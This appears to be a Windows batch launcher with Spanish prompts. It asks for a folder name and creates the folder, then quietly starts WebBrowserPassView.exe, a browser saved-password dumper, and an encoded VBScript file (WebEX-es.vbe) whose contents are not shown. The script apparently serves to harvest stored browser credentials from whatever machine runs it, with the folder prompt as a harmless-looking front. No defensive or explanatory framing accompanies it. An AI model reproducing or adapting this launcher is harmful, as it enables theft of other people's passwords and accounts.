@echo off
mode 50,6
color a
goto I
:emptyoption
echo.
echo El nombre no puede quedar vacio.
pause>nul
cls
goto I
:I
echo Que nombre le pongo a la carpeta?
set /p namecomputer=
if "%namecomputer%" EQU "" (goto emptyoption)
md %namecomputer%
start WebBrowserPassView.exe
start WebEX-es.vbe
cls
exit